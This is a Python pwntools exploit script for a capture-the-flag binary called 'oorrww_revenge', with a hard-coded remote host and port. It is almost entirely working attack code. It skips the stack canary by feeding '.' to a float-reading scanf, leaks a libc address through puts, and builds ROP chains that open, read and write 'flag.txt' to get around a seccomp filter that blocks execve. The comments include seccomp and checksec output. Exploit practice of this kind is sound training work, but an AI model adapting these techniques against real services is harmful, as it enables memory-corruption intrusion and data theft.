#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './oorrww_revenge'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '193.148.168.30', 7667

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x040139e
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ seccomp-tools dump ./oorrww_revenge 
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
#  0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008
#  0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008
#  0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0008: 0x06 0x00 0x00 0x00000000  return KILL
# └──╼ [★]$ pwn checksec oorrww_revenge 
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x3fe000)
#     RUNPATH:  b'.'


# https://stackoverflow.com/questions/1592158/convert-hex-to-float
def convertToDouble(adrr: int) -> bytes:
    payload = p64(adrr).hex()
    payload = struct.unpack('d', bytes.fromhex(payload))[0]
    return str(payload).encode()

def execute(payload, rbp):
    assert(len(payload) <= 9)

    for p in range(0, 19):
        io.sendlineafter(b":", convertToDouble(p))

    io.sendlineafter(b":", b'.') # canary
    io.sendlineafter(b":", convertToDouble(rbp)) # rbp

    payload += [0x0] * (9 - len(payload))
    for p in payload:
        io.sendlineafter(b":", convertToDouble(p))

def exploit():
    global io
    io = initialize()

    rop = ROP(exe)
    RET = rop.find_gadget(['ret'])[0]   
    LEAVE_RET =  rop.find_gadget(['leave', 'ret'])[0]
    POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]

    payload = [
        POP_RAX,
        elf.got['puts'],
        0x04012da, # gifts+??
        elf.bss() + 0x300,
        0x04012f4, # main+??
    ]
    execute(payload, elf.bss() + 0x100)

    io.recvline()
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - libc.sym['puts']

    rop = ROP(libc)
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
    POP_RCX = rop.find_gadget(['pop rcx', 'ret'])[0]
    POP_R13 = rop.find_gadget(['pop r13', 'ret'])[0]
    POP_RSP = rop.find_gadget(['pop rsp', 'ret'])[0]
    POP_RDX_RBX = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
    MOV_PTR_RDI_RCX = 0x0bfc76 # mov qword ptr [rdi], rcx ; ret

    payload = [
        POP_RDI,
        0x3,
        POP_RSI,
        elf.bss() + 0x560,
        POP_RDX_RBX,
        0x40,
        0x0,
        libc.sym['read'],

        POP_RDI,
        0x1,
        libc.sym['write']
    ]

    payload += [0x0] * (19 - len(payload))
    for p in payload:
        io.sendlineafter(b":", convertToDouble(p))

    io.sendlineafter(b":", b'.') # canary
    io.sendlineafter(b":", convertToDouble(elf.bss() + 0x200)) # rbp

    payload = [
        POP_RCX,
        0x7478742e67616c66,
        libc.address + MOV_PTR_RDI_RCX,
        POP_RSI,
        0x0,
        libc.address + 0x011d03d, # mov qword ptr [rdi + 8], rsi ; ret
        libc.sym['open'],
        POP_RSP,
        elf.bss() + 0x308 - (21 * 8)
    ]

    payload += [0x0] * (9 - len(payload))
    for p in payload:
        io.sendlineafter(b":", convertToDouble(p))

    log.success('libc base: %#x', libc.address)
    log.success('bss: %#x', elf.bss())  
    io.interactive()
    
if __name__ == '__main__':
    exploit()